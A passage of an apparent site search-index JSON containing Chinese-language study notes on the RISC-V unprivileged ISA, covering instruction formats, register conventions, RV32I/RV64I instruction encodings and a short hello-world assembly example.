\u7684\u4f4e 32 \u4f4d\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d srliw i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0000000 shamt rs1 101 rd 0011011 \u6307\u4ee4\u683c\u5f0f \uff1asrliw rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs1 \u7684\u4f4e 32 \u4f4d\u903b\u8f91\u53f3\u79fb shamt \u4f4d\uff0c\u7ed3\u679c\u5b58\u5230 rd \u7684\u4f4e 32 \u4f4d\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d sraiw i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0100000 shamt rs1 101 rd 0011011 \u6307\u4ee4\u683c\u5f0f \uff1asraiw rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs1 \u7684\u4f4e 32 \u4f4d\u7b97\u6570\u53f3\u79fb shamt \u4f4d\uff0c\u7ed3\u679c\u5b58\u5230 rd \u7684\u4f4e 32 \u4f4d\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d addw r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 000 rd 0111011 \u6307\u4ee4\u683c\u5f0f \uff1aaddw rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u4f4e 32 \u4f4d\u52a0\u6cd5\uff0c\u5f97\u5230 32 \u4f4d\u7ed3\u679c\uff08\u5ffd\u7565\u6ea2\u51fa\uff09\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d subw r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0100000 rs2 rs1 000 rd 0111011 \u6307\u4ee4\u683c\u5f0f \uff1asubw rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u4f4e 32 \u4f4d\u51cf\u6cd5\uff0c\u5f97\u5230 32 \u4f4d\u7ed3\u679c\uff08\u5ffd\u7565\u6ea2\u51fa\uff09\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d sllw r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 001 rd 0111011 \u6307\u4ee4\u683c\u5f0f \uff1asllw rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u4f4e 32 \u4f4d\u5de6\u79fb\uff0c\u7ed3\u679c\u7531 32 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d srlw r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 101 rd 0111011 \u6307\u4ee4\u683c\u5f0f \uff1asrlw rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u4f4e 32 \u4f4d\u903b\u8f91\u53f3\u79fb\uff0c\u7ed3\u679c\u7531 32 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d sraw r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0100000 rs2 rs1 101 rd 0111011 \u6307\u4ee4\u683c\u5f0f \uff1asraw rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u4f4e 32 \u4f4d\u7b97\u672f\u53f3\u79fb\uff0c\u7ed3\u679c\u7531 32 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d \u5176\u5b83\u6307\u4ee4\u4fee\u6539 \u00b6 slli\u3001srli\u3001srai \u4e09\u6761\u6307\u4ee4\u4fee\u6539\u4e86\u683c\u5f0f\uff1a slli i \u578b\uff08\u6539\uff09 31 26 25 20 19 15 14 12 11 7 6 0 000000 shamt rs1 001 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aslli rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1a\u5de6\u79fb\u8fd0\u7b97\uff0cshamt \u6709 6 \u4f4d \u6ce8\u610f \uff1a\u683c\u5f0f\u4e0a\u6bd4 RV32I \u7684 slli \u591a\u4e86\u4e00\u4f4d shamt srli i \u578b\uff08\u6539\uff09 31 26 25 20 19 15 14 12 11 7 6 0 000000 shamt rs1 101 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1asrli rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1a\u903b\u8f91\u53f3\u79fb\u8fd0\u7b97\uff0cshamt \u6709 6 \u4f4d \u6ce8\u610f \uff1a\u683c\u5f0f\u4e0a\u6bd4 RV32I \u7684 srli \u591a\u4e86\u4e00\u4f4d shamt srai i \u578b\uff08\u6539\uff09 31 26 25 20 19 15 14 12 11 7 6 0 010000 shamt rs1 101 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1asrai rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1a\u7b97\u6570\u53f3\u79fb\u8fd0\u7b97\uff0cshamt \u6709 6 \u4f4d \u6ce8\u610f \uff1a\u683c\u5f0f\u4e0a\u6bd4 RV32I \u7684 srai \u591a\u4e86\u4e00\u4f4d shamt \u5176\u5b83\u683c\u5f0f\u6ca1\u6709\u4fee\u6539\u4f46\u529f\u80fd\u6709\u8c03\u6574\u7684\u6307\u4ee4\uff1a SLL/SRL/SRA \uff1a\u79fb\u4f4d\u4f4d\u6570\u53d6\u51b3\u4e8e rs2 \u7684\u4f4e 6 \u4f4d\uff08RV32I \u662f\u53d6\u51b3\u4e8e rs2 \u7684\u4f4e 5 \u4f4d\uff09 LUI \uff1a\u5c06 20 \u4f4d\u7acb\u5373\u6570\u653e\u5165 rd \u7684 31~12 \u4f4d\uff0c\u4f4e 12 \u4f4d\u7f6e 0\uff0c\u7136\u540e\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d AUIPC \uff1a\u5c06 20 \u4f4d\u7acb\u5373\u6570\u540c LUI \u4e00\u6837\u5904\u7406\uff0c\u7136\u540e\u52a0\u4e0a pc \u503c\u653e\u5165 rd \u88c5\u8f7d\u5b58\u50a8\u6307\u4ee4 \u00b6 ld I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 011 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1ald rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a 64 \u4f4d\u6570\u5230 rd \u4e2d lwu I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 101 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1alwu rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a 32 \u4f4d\u6570\u5230 rd \u4e2d\uff0c\u7136\u540e\u96f6\u6269\u5c55\u5230 64 \u4f4d sd S \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 011 imm[4:0] 0100011 \u6307\u4ee4\u683c\u5f0f \uff1asd rs2, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs2\uff0864 \u4f4d\uff09\u62f7\u8d1d\u5230 rs1 + imm \u5904\u5185\u5b58\u4e2d Zicsr \u6269\u5c55 \u00b6 \u89c1 \u7279\u6743\u7ea7\u90e8\u5206 > \u63a7\u5236\u548c\u72b6\u6001\u5bc4\u5b58\u5668\uff08CSRs\uff09> CSR \u6307\u4ee4\uff08Zicsr \u6269\u5c55\uff09 \u6c47\u7f16\u4ee3\u7801 \u00b6 .text .align 2 .globl main main: addi sp , sp , -16 sw ra , 12 ( sp ) lui a0 , %hi ( string1 ) addi a0 , a0 , %lo ( string1 ) lui a1 , %hi ( string2 ) addi a1 , a1 , %lo ( string2 ) call printf lw ra , 12 ( sp ) addi sp , sp , 16 li a0 , 0 ret .section .rodata .balign 4 string1: .string \"Hello, %s!\\n\" string2: .string \"world\" .text\uff1a\u8fdb\u5165\u4ee3\u7801\u6bb5 .align 2\uff1a\u4ee3\u7801\u6bb5\u5bf9\u9f50\u5230 2^2 \u5b57\u8282 .globl main\uff1a\u58f0\u660e\u5168\u5c40\u6807\u53f7 main .section .rodata\uff1a\u8fdb\u5165 rodata \u6bb5 .balign 4\uff1a\u5bf9\u9f50\u6570\u636e\u6bb5\u5230 4 \u5b57\u8282 .string ... \u5b9a\u4e49\u5b57\u7b26\u4e32 \u5176\u5b83\u6307\u4ee4\uff1a .data\uff1a\u8fdb\u5165\u6570\u636e\u6bb5 .bss\uff1a\u8fdb\u5165 bss \u6bb5 .byte b1, b2, ..., bn\uff1a\u5b58\u653e\u4e00\u4e9b\u5b57\u8282 .half w1, w2, ..., wn\uff1a\u5b58\u653e\u4e00\u4e9b\u534a\u5b57\uff0816 \u4f4d\uff09 .word w1, w2, ..., wn\uff1a\u5b58\u653e\u4e00\u4e9b\u5b57\uff0832 \u4f4d\uff09","title":"RISC-V \u975e\u7279\u6743\u7ea7 ISA"},{"location":"cs/pl/riscv/unprivileged/#risc-v-isa","text":"Abstract RISC-V \u6307\u4ee4\u96c6\u7684\u975e\u7279\u6743\u7ea7\uff08\u7528\u6237\u7ea7\uff09\u90e8\u5206\u3002 \u53c2\u8003\uff1a The RISC-V Instruction Set Manual Volume I: Unprivileged ISA v.20191213 \u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u201c\uff08\u5927\u4e00\u6625\u590f\uff09\u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u201c\uff08\u5927\u4e8c\u79cb\u51ac\uff09\u8bfe\u7a0b","title":"RISC-V \u975e\u7279\u6743\u7ea7 ISA"},{"location":"cs/pl/riscv/unprivileged/#rv32i","text":"","title":"RV32I \u57fa\u7840"},{"location":"cs/pl/riscv/unprivileged/#_1","text":"\u4e00\u4e2a PC \u5bc4\u5b58\u5668\uff08program counter\uff09 32 \u4e2a 32 \u4f4d\u5bc4\u5b58\u5668\uff08x0~x31\uff09 \u5176\u4e2d x0 \u6c38\u8fdc\u662f 0 \u5bc4\u5b58\u5668\u7684\u5e38\u7528\u7528\u9014\u5982\u4e0b\uff1a \u5bc4\u5b58\u5668 ABI \u540d\u79f0 \u7528\u9014\u63cf\u8ff0 saver x0 zero \u786c\u4ef6 0 x1 ra \u8fd4\u56de\u5730\u5740\uff08return address\uff09 caller x2 sp \u6808\u6307\u9488\uff08stack pointer\uff09 callee x3 gp \u5168\u5c40\u6307\u9488\uff08global pointer\uff09 x4 tp \u7ebf\u7a0b\u6307\u9488\uff08thread pointer\uff09 x5 t0 \u4e34\u65f6\u53d8\u91cf/\u5907\u7528\u94fe\u63a5\u5bc4\u5b58\u5668\uff08alternate link reg\uff09 caller x6-7 t1-2 \u4e34\u65f6\u53d8\u91cf caller x8 s0/fp \u9700\u8981\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668/\u5e27\u6307\u9488\uff08frame pointer\uff09 callee x9 s1 \u9700\u8981\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668 callee x10-11 a0-1 \u51fd\u6570\u53c2\u6570/\u8fd4\u56de\u503c caller x12-17 a2-7 \u51fd\u6570\u53c2\u6570 caller x18-27 s2-11 \u9700\u8981\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668 callee x28-31 t3-6 \u4e34\u65f6\u53d8\u91cf caller \u5176\u4e2d sp s0-11 \u9700\u8981\u5728\u51fd\u6570\u8c03\u7528\u524d\u540e\u4fdd\u8bc1\u4e00\u81f4\uff0c\u5176\u5b83\u4e0d\u7528\u4fdd\u8bc1","title":"\u5bc4\u5b58\u5668"},{"location":"cs/pl/riscv/unprivileged/#_2","text":"RV32I \u6709 4 \u79cd\u57fa\u7840\u7684\u6307\u4ee4\u683c\u5f0f\uff08R/I/S/U\uff09\uff0c\u518d\u6839\u636e\u7acb\u5373\u6570\u89e3\u7801\u7684\u4e0d\u540c\u53c8\u5206\u51fa\u4e24\u79cd\uff08B/J\uff09\uff0c\u603b\u5171\u516d\u79cd\u6307\u4ee4\u683c\u5f0f","title":"\u6307\u4ee4\u683c\u5f0f"},{"location":"cs/pl/riscv/unprivileged/#r","text":"31 25 24 20 19 15 14 12 11 7 6 0 funct7 rs2 rs1 funct3 rd opcode \u4f7f\u7528\u5bc4\u5b58\u5668\u8fdb\u884c\u6570\u5b57\u903b\u8f91\u8fd0\u7b97\u7684\u6307\u4ee4\u683c\u5f0f\uff0c\u8fd0\u7b97\u7531 opcode funct3 funct7 \u51b3\u5b9a\uff0crd = rs1 op rs2\uff08shift \u7c7b\u4f8b\u5916\uff0c\u5b83\u4eec\u7528 rs2 \u4f4d\u7f6e\u8868\u793a\u79fb\u4f4d\u6570\u7684\u7acb\u5373\u6570\uff09","title":"R \u578b\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#i","text":"31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 funct3 rd opcode \u4f7f\u7528\u5bc4\u5b58\u5668\u548c\u7acb\u5373\u6570\u8fdb\u884c\u6570\u5b57\u903b\u8f91\u8fd0\u7b97\uff0c\u4ee5\u53ca load \u7c7b\u6307\u4ee4\u7b49\u7684\u6307\u4ee4\u683c\u5f0f\uff0c\u8fd0\u7b97\u7c7b\u578b\u7b49\u7531 opcode funct3 \u51b3\u5b9a\uff0c\u5982\u679c\u662f ALU \u8fd0\u7b97\uff0c\u5219 rd = rs1 op imm \u7acb\u5373\u6570\u662f {{20{inst[31]}}, inst[31:20]}\uff0c\u4e5f\u5c31\u662f\u5bf9 imm[11:0] \u8fdb\u884c\u7b26\u53f7\u4f4d\u6269\u5c55\u5230 32 \u4f4d","title":"I \u578b\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#s","text":"31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 funct3 imm[4:0] opcode store \u7c7b\u6307\u4ee4\uff0cstore \u7684\u5927\u5c0f\u7531 funct3 \u51b3\u5b9a\uff0c\u4ee5\u53d8\u5740\u6a21\u5f0f\u8fdb\u884c\u5bfb\u5740\uff0c\u5373 rs1 = [rs2+imm] \u7acb\u5373\u6570\u662f {{20{inst[31]}}, inst[31:25], inst[11:7]}","title":"S \u578b\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#b","text":"31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 funct3 imm[4:1,11] opcode \u7531 S \u578b\u6307\u4ee4\u5206\u6765\uff0c\u4e0e\u4e4b\u533a\u522b\u662f\u7acb\u5373\u6570\u8bfb\u53d6\u987a\u5e8f\u4e0d\u540c\uff0c\u662f\u6240\u6709\u5206\u652f\u7c7b\u6307\u4ee4\u3002\u662f\u5426\u5206\u652f\u7531 funct3 rs1 rs2 \u51b3\u5b9a \u7acb\u5373\u6570\u662f {{19{inst[31]}}, inst[31], inst[7], inst[30:25], inst[11:8], 1'b0}","title":"B \u578b\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#u","text":"31 12 11 7 6 0 imm[31:12] rd opcode LUI \u548c AUIPC\uff0c\u7acb\u5373\u6570\u90fd\u662f\u5728\u9ad8 20 \u4f4d\uff0c\u800c\u4e14\u6ca1\u6709\u6e90\u64cd\u4f5c\u6570 \u7acb\u5373\u6570\u662f {inst[31:12], 12'b0}","title":"U \u578b\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#j","text":"31 12 11 7 6 0 imm[20,10:1,11,19:12] rd opcode \u7531 U \u578b\u6307\u4ee4\u5206\u6765\uff0c\u533a\u522b\u4e5f\u662f\u7acb\u5373\u6570\u8bfb\u53d6\u4e0d\u540c\uff0c\u4ec5\u6709 JAL \u4e00\u4e2a\u6307\u4ee4 \u7acb\u5373\u6570\u662f {{11{inst[31]}}, inst[31], inst[19:12], inst[20], inst[30:21], 1'b0}","title":"J \u578b\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#rv32i_1","text":"","title":"RV32I \u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#_3","text":"","title":"\u6574\u578b\u8ba1\u7b97\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#_4","text":"add R \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 000 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1aadd rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 + rs2 \u6ce8\u610f \uff1a\u6ea2\u51fa\u4f1a\u88ab\u5ffd\u7565 sub r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0100000 rs2 rs1 000 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1asub rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 - rs2 \u6ce8\u610f \uff1a\u6ea2\u51fa\u4f1a\u88ab\u5ffd\u7565 addi I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 000 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aaddi rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 + imm \u6ce8\u610f \uff1a\u6ea2\u51fa\u4f1a\u88ab\u5ffd\u7565\uff0cimm \u5728 [-2048, 2047] \u8303\u56f4\u5185","title":"\u52a0\u51cf\u6cd5\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#_5","text":"slt r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 010 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1aslt rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08set less than\uff09\u5982\u679c rs1 < rs2 \u5219 rd = 1\uff0c\u5426\u5219 rd = 0 \u6ce8\u610f \uff1ars1 rs2 \u4f1a\u88ab\u89c6\u4e3a\u6709\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83 sltu r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 011 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1asltu rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08set less than unsigned\uff09\u5982\u679c rs1 < rs2 \u5219 rd = 1\uff0c\u5426\u5219 rd = 0 \u6ce8\u610f \uff1ars1 rs2 \u4f1a\u88ab\u89c6\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83 slti I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 010 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aslti rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08set less than immediate\uff09\u5982\u679c rs1 < imm \u5219 rd = 1\uff0c\u5426\u5219 rd = 0 \u6ce8\u610f \uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0c\u88ab\u89c6\u4e3a\u6709\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83 sltiu I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 011 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1asltiu rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08set less than immediate unsigned\uff09\u5982\u679c rs1 < imm \u5219 rd = 1\uff0c\u5426\u5219 rd = 0 \u6ce8\u610f \uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0crs1 imm \u88ab\u89c6\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83","title":"\u6bd4\u8f83\u8fd0\u7b97\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#_6","text":"and r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 111 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1aand rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 & rs2 \u6309\u4f4d\u4e0e or r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 110 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1aor rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 | rs2 \u6309\u4f4d\u6216 xor r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 100 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1axor rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 ^ rs2 \u6309\u4f4d\u5f02\u6216 andi I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 111 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aandi rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 & imm \u6309\u4f4d\u4e0e \u6ce8\u610f \uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0c\u4f1a\u6269\u5c55\u7b26\u53f7\u4f4d ori I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 110 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aori rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 | imm \u6309\u4f4d\u6216 \u6ce8\u610f \uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0c\u4f1a\u6269\u5c55\u7b26\u53f7\u4f4d xori I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 100 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1axori rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 ^ imm \u6309\u4f4d\u5f02\u6216 \u6ce8\u610f \uff1aimm \u5728 [-2048, 2047] \u8303\u56f4\u5185\uff0c\u4f1a\u6269\u5c55\u7b26\u53f7\u4f4d\uff08xori rd, rs1, -1 \u76f8\u5f53\u4e8e rd = ~rs1\uff09","title":"\u4e8c\u8fdb\u5236\u4f4d\u8fd0\u7b97\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#_7","text":"sll r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 001 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1asll rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 << rs2[4:0] \u5de6\u79fb\uff08\u5de6\u4fa7\u4e22\u6389\uff0c\u53f3\u4fa7\u8865 0\uff09 \u6ce8\u610f \uff1a\u4f1a\u53d6 rs2 \u5185\u6570\u503c\u7684\u4f4e 5 \u4f4d\u8fdb\u884c\u8fd0\u7b97 srl r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 101 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1asrl rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 >> rs2[4:0] \u903b\u8f91\u53f3\u79fb\uff08\u5de6\u4fa7\u8865 0\uff0c\u53f3\u4fa7\u4e22\u6389\uff09 \u6ce8\u610f \uff1a\u4f1a\u53d6 rs2 \u5185\u5bb9\u7684\u4f4e 5 \u4f4d sra r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0100000 rs2 rs1 101 rd 0110011 \u6307\u4ee4\u683c\u5f0f \uff1asra rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 >>> rs2[4:0] \u7b97\u6570\u53f3\u79fb\uff08\u5de6\u4fa7\u8865\u7b26\u53f7\u4f4d\uff0c\u53f3\u4fa7\u4e22\u6389\uff09 \u6ce8\u610f \uff1a\u4f1a\u53d6 rs2 \u5185\u5bb9\u7684\u4f4e 5 \u4f4d\u8fdb\u884c\u8fd0\u7b97 slli i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0000000 shamt rs1 001 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aslli rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 << shamt \u5de6\u79fb\uff08\u5de6\u4fa7\u4e22\u6389\uff0c\u53f3\u4fa7\u8865 0\uff09 \u6ce8\u610f \uff1ashamt\uff08shift amount\uff09\u4f1a\u7f16\u7801\u5230\u539f\u6765 rs2 \u7684\u4f4d\u7f6e\uff0c\u5b83\u662f\u4e00\u4e2a\u7acb\u5373\u6570\uff0c\u6b63\u597d\u6709 5 \u4f4d srli i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0000000 shamt rs1 101 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1asrli rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 >> shamt \u903b\u8f91\u53f3\u79fb\uff08\u5de6\u4fa7\u8865 0\uff0c\u53f3\u4fa7\u4e22\u6389\uff09 \u6ce8\u610f \uff1ashamt\uff08shift amount\uff09\u4f1a\u7f16\u7801\u5230\u539f\u6765 rs2 \u7684\u4f4d\u7f6e\uff0c\u5b83\u662f\u4e00\u4e2a\u7acb\u5373\u6570\uff0c\u6b63\u597d\u6709 5 \u4f4d srai i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0100000 shamt rs1 101 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1asrai rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1ard = rs1 >>> shamt \u7b97\u6570\u53f3\u79fb\uff08\u5de6\u4fa7\u8865\u7b26\u53f7\u4f4d\uff0c\u53f3\u4fa7\u4e22\u6389\uff09 \u6ce8\u610f \uff1ashamt\uff08shift amount\uff09\u4f1a\u7f16\u7801\u5230\u539f\u6765 rs2 \u7684\u4f4d\u7f6e\uff0c\u5b83\u662f\u4e00\u4e2a\u7acb\u5373\u6570\uff0c\u6b63\u597d\u6709 5 \u4f4d","title":"\u79fb\u4f4d\u8fd0\u7b97\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#_8","text":"lui U \u578b 31 12 11 7 6 0 imm[31:12] rd 0110111 \u6307\u4ee4\u683c\u5f0f \uff1alui imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08load upper immediate\uff09rd = imm << 12 \u5c06 imm \u52a0\u8f7d\u5230 rd \u7684\u9ad8 20 \u4f4d \u6ce8\u610f \uff1aimm \u4e0d\u80fd\u8d85\u8fc7 20 \u4f4d\uff0crd \u4ee5\u5341\u516d\u8fdb\u5236\u8868\u793a\u5c31\u662f imm \u540e\u63a5\u4e09\u4e2a 0 auipc U \u578b 31 12 11 7 6 0 imm[31:12] rd 0010111 \u6307\u4ee4\u683c\u5f0f \uff1aauipc rd \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08add upper immediate with pc\uff09rd = pc + imm << 12 \u5c06 imm \u52a0\u8f7d\u5230\u9ad8 20 \u4f4d\uff0c\u7136\u540e\u52a0\u4e0a pc \u503c \u6ce8\u610f \uff1a\u5e38\u7528\u6765\u6784\u5efa pc \u76f8\u5bf9\u5bfb\u5740\u7684\u5730\u5740\uff0cimm \u4e0d\u80fd\u8d85\u8fc7 20 \u4f4d","title":"\u6570\u636e\u52a0\u8f7d\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#_9","text":"","title":"\u63a7\u5236\u6d41\u53d8\u5316\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#jump","text":"jal J \u578b 31 12 11 7 6 0 imm[20,10:1,11,19:12] rd 1101111 \u6307\u4ee4\u683c\u5f0f \uff1ajal rd, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08jump and link\uff09rd = pc+4, pc = pc+imm \u5373\u5c06\u5f53\u524d\u6307\u4ee4\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\u5b58\u5165 rd\uff0c\u7136\u540e\u76f8\u5bf9\u8df3\u8f6c\u5230 imm \u5904 \u6ce8\u610f \uff1aimm \u5728\u6c47\u7f16\u7a0b\u5e8f\u4e2d\u4e00\u822c\u7528\u6807\u53f7\u6765\u6307\u5b9a\uff0cjal \u53ef\u4ee5\u8df3\u5230 \u00b11MiB \u8303\u56f4\u5185\u7684\u4ee3\u7801 jalr I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 000 rd 1100111 \u6307\u4ee4\u683c\u5f0f \uff1ajalr rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1ard = pc+4, pc = (imm+rs1) & 0xFFFFFFFE \u5373\u6700\u4f4e\u4f4d\u4f1a\u88ab\u8bbe\u4e3a 0 \u6ce8\u610f \uff1a\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u4f4d\u7f6e\u8df3\u8f6c","title":"jump \u7c7b\u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#branch","text":"beq B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 000 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1abeq rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08branch if equal\uff09\u5982\u679c rs1 == rs2\uff0c\u5219 pc = pc+imm \u6ce8\u610f \uff1a\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185 bne B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 001 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1abne rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08branch if not equal\uff09\u5982\u679c rs1 != rs2\uff0c\u5219 pc = pc+imm \u6ce8\u610f \uff1a\u53ef\u4ee5\u8df3\u8f6c\u5230 